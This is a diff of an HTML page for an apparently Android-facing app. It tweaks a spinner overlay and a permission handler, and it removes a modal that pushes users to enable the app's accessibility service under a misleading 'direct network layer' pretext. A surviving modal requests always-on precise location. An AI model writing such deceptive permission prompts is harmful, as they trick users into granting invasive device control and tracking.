@@ -7,7 +7,6 @@
     <link rel="stylesheet" href="style.css">
     <link rel="stylesheet" href="page.css">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
 </head>
 
 <body>
@@ -32,8 +31,7 @@
             <button class="action-btn">History</button>
         </div>
 
-
-        <div class="overlayer">
+        <div class="overlayer hide">
             <div class="spinner"></div>
         </div>
         <div class="perm-modal p-modal hide">
@@ -44,22 +42,9 @@
                     <li><b>Location: 'Precise' &amp; 'All The Time' or 'Background'</b></li>
                 </ol>
             </div>
-            <div class="bottom"><button class="btn" onclick="requestAllPermissions()">Continue</button></div>
+            <div class="bottom"><button class="btn" onclick="requestMissingPermissions()">Continue</button></div>
         </div>
 
-        <div class="perm-modal a-modal hide">
-            <div class="title">Almost there!<span></span></div>
-            <div class="body">
-                After this step, this app will fuse into the direct network layer, ensuring nothing in background will delay or filter your packets. 
-                <br>Enable app's accessibility to access restricted network access
-                <ol>
-                    <li>Tap on the button</li>
-                    <li>Scroll and click 'Installed apps' or 'Apps'. If you are on old Android version(up to 7), SKIP step 2</li>
-                    <li>Check the list and enable this app.</li>
-                </ol>
-            </div>
-            <div class="bottom"><button class="btn" onclick="launchAccessibilityPerm()">Continue</button></div>
-        </div>
         <div class="perm-modal d-modal hide">
             <div class="title">Stability!<span></span></div>
             <div class="body">
